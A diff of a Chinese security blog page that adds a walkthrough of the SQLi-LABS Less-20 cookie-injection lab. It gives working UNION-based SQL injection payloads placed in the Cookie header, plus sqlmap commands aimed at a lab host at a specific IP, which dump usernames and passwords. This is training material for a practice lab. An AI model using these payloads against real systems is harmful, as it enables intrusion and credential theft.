@@ -522,21 +522,21 @@ SQLi-LABS闯关游戏下载地址：https://github.com/Audi-1/sql">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-07-18
+                    2020-07-19
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.5k
+                    1.8k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
+                    8 分
                 </div>
                 
 				
@@ -779,6 +779,56 @@ SQLi-LABS闯关游戏下载地址：https://github.com/Audi-1/sql">
 <td>id=(‘$id’)</td>
 </tr>
 </tbody></table>
+<h3 id="Less-18-POST单引号UA注入"><a href="#Less-18-POST单引号UA注入" class="headerlink" title="Less-18(POST单引号UA注入)"></a>Less-18(POST单引号UA注入)</h3><h3 id="Less-19-POST单引号Referer注入"><a href="#Less-19-POST单引号Referer注入" class="headerlink" title="Less-19(POST单引号Referer注入)"></a>Less-19(POST单引号Referer注入)</h3><h3 id="Less-20-POST单引号Cookie注入"><a href="#Less-20-POST单引号Cookie注入" class="headerlink" title="Less-20(POST单引号Cookie注入)"></a>Less-20(POST单引号Cookie注入)</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>单引号Cookie注入</td>
+<td>username=’$cookee’</td>
+</tr>
+</tbody></table>
+<h4 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h4><pre class="line-numbers language-sql"><code class="language-sql">进来先输入用户名密码<span class="token punctuation">(</span>admin<span class="token operator">/</span>admin<span class="token punctuation">)</span>，测试一下，发现是关于cookie值的进行注入，那我们就Burp抓包进行注入
+
+<span class="token comment" spellcheck="true">#修改Cookie，查看页面变化，判断sql注入类别</span>
+Cookie: uname<span class="token operator">=</span>admin
+Cookie: uname<span class="token operator">=</span>admin'
+
+<span class="token comment" spellcheck="true">#确定字段数</span>
+Cookie: uname<span class="token operator">=</span>jwt' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span> <span class="token comment" spellcheck="true">--+</span>
+Cookie: uname<span class="token operator">=</span>jwt' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span> <span class="token comment" spellcheck="true">--+</span>
+
+<span class="token comment" spellcheck="true">#联合查询查看显示位</span>
+Cookie: uname<span class="token operator">=</span>jwt' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment" spellcheck="true">--+</span>
+
+<span class="token comment" spellcheck="true">#爆库</span>
+Cookie: uname<span class="token operator">=</span>jwt' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+</span>
+
+<span class="token comment" spellcheck="true">#爆表</span>
+Cookie: uname<span class="token operator">=</span>jwt<span class="token string">' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='</span>security' <span class="token comment" spellcheck="true">--+</span>
+
+<span class="token comment" spellcheck="true">#爆列</span>
+Cookie: uname<span class="token operator">=</span>jwt<span class="token string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>users' <span class="token comment" spellcheck="true">--+</span>
+
+<span class="token comment" spellcheck="true">#爆值</span>
+Cookie: uname<span class="token operator">=</span>jwt' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200719155013.png" alt></p>
+<h4 id="SqlMap注入"><a href="#SqlMap注入" class="headerlink" title="SqlMap注入"></a>SqlMap注入</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#爆库</span>
+sqlmap -u http://139.224.112.182:8087/sqli1/Less-20/index.php --cookie <span class="token string">'uname=admin'</span> --level 2 --dbs
+
+<span class="token comment" spellcheck="true">#爆表</span>
+sqlmap -u http://139.224.112.182:8087/sqli1/Less-20/index.php --cookie <span class="token string">'uname=admin'</span> --level 2 --tables -D security
+
+<span class="token comment" spellcheck="true">#爆列</span>
+sqlmap -u http://139.224.112.182:8087/sqli1/Less-20/index.php --cookie <span class="token string">'uname=admin'</span> --level 2 --columns -D security -T <span class="token function">users</span>
+
+<span class="token comment" spellcheck="true">#爆值</span>
+sqlmap -u http://139.224.112.182:8087/sqli1/Less-20/index.php --cookie <span class="token string">'uname=admin'</span> --level 2 --dump -C username,password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h2 id="赞助💰"><a href="#赞助💰" class="headerlink" title="赞助💰"></a>赞助💰</h2><p>如果你觉得对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭</p>
 <table>
   <tbody>
@@ -1574,7 +1624,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">167.5k</span>&nbsp;字
+                class="white-color">169.9k</span>&nbsp;字
             
             
             
